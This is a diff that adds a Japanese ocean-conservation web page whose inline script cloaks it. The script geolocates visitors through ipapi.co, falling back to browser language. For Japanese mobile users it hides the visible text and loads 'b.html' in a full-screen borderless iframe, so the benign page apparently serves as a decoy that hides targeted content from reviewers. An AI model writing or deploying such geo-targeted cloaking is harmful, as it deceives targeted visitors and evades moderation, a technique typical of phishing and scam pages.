@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>海洋を守り、未来を守る</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 20px;
+            background-color: #e0f7fa;
+            color: #333;
+        }
+        h1 {
+            color: #00796b;
+        }
+        h2 {
+            color: #004d40;
+        }
+        ul {
+            list-style-type: none;
+            padding: 0;
+        }
+        li {
+            margin: 10px 0;
+        }
+        footer {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 0.9em;
+            color: #555;
+        }
+        .content {
+            display: block;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="mainContent" class="content">
+        <h1>海洋を守り、未来を守る</h1>
+        <p>海洋は地球上で最も重要な生態系の一つであり、豊かな生物多様性と資源を育んでいます。しかし、人間の活動が加速する中で、海洋生態系は前所未有の脅威に直面しています。</p>
+
+        <h2>なぜ海洋生態系の発展が重要なのか？</h2>
+        <ul>
+            <li><strong>生物多様性：</strong>健康な海洋生態系は無数の種の生存を支え、地球規模の食物連鎖の重要な構成要素です。</li>
+            <li><strong>気候調節：</strong>海洋は二酸化炭素を吸収し、気候を調整し、地球の生態バランスを維持します。</li>
+        </ul>
+
+        <h2>私たちにできること</h2>
+        <ul>
+            <li>生態保護に参加する：海洋保護団体に参加し、海洋をきれいにする活動を支援し、汚染に立ち向かいましょう。</li>
+            <li>持続可能な漁業を推進する：持続可能な方法で捕獲された海産物を選び、環境に優しい企業を支援します。</li>
+            <li>教育と意識向上：海洋生態に関する知識を広め、より多くの人々が海洋保護に関心を持つよう促します。</li>
+        </ul>
+
+        <footer>
+            <p>私たちと一緒に行動し、青い地球を守りましょう！</p>
+        </footer>
+    </div>
+
+    <script>
+        function isMobileDevice() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
+        function isJapaneseBrowser() {
+            return navigator.language.startsWith('ja');
+        }
+
+        function loadIframe() {
+            var mainContent = document.getElementById('mainContent');
+            mainContent.classList.add('hidden');
+            
+            var iframe = document.createElement('iframe');
+            iframe.src = 'b.html';
+            iframe.style.width = '100%';
+            iframe.style.height = '100vh';
+            iframe.style.border = 'none';
+            document.body.appendChild(iframe);
+        }
+
+        // IP情報を取得してチェック
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => { 
+                if (data.country === 'JP' && isMobileDevice()) {
+                    loadIframe();
+                    return;
+                }
+            })
+            .catch(error => {
+                console.log('IP API error:', error);
+                // API呼び出しが失敗した場合、ブラウザ言語をチェック
+                if (isJapaneseBrowser() && isMobileDevice()) {
+                    loadIframe();
+                    return;
+                }
+            });
+    </script>
+</body>
+</html>
